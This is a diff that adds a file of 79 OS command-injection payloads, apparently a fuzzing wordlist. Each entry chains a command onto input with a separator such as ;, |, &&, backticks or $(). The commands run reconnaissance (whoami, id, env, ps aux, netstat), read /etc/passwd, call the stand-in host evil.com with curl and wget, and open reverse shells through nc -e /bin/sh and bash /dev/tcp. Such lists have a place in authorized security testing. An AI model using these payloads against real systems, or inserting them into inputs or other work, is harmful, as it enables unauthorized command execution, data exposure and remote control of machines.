@@ -1,0 +1,79 @@
+;whoami
+|whoami
+&whoami
+&&whoami
+;id
+|id
+&id
+&&id
+;ls
+|ls
+&ls
+&&ls
+;cat /etc/passwd
+|cat /etc/passwd
+&cat /etc/passwd
+&&cat /etc/passwd
+;dir
+|dir
+&dir
+&&dir
+;type nul
+|type nul
+&type nul
+&&type nul
+;ping 127.0.0.1
+|ping 127.0.0.1
+&ping 127.0.0.1
+&&ping 127.0.0.1
+;sleep 5
+|sleep 5
+&sleep 5
+&&sleep 5
+;curl evil.com
+|curl evil.com
+&curl evil.com
+&&curl evil.com
+;wget evil.com
+|wget evil.com
+&wget evil.com
+&&wget evil.com
+; nc -e /bin/sh 127.0.0.1 1337
+| nc -e /bin/sh 127.0.0.1 1337
+;uname -a
+|uname -a
+&uname -a
+&&uname -a
+;hostname
+|hostname
+&hostname
+&&hostname
+;env
+|env
+&env
+&&env
+;ps aux
+|ps aux
+&ps aux
+&&ps aux
+;netstat -ant
+|netstat -ant
+&netstat -ant
+&&netstat -ant
+;ifconfig
+|ifconfig
+&ifconfig
+&&ifconfig
+;ip addr
+|ip addr
+&ip addr
+&&ip addr
+`whoami`
+$(whoami)
+{whoami}
+| whoami
+; whoami
+& whoami
+&& whoami
+;nc 127.0.0.1 1234 -e /bin/sh
+;bash -i >& /dev/tcp/127.0.0.1/1234 0>&1
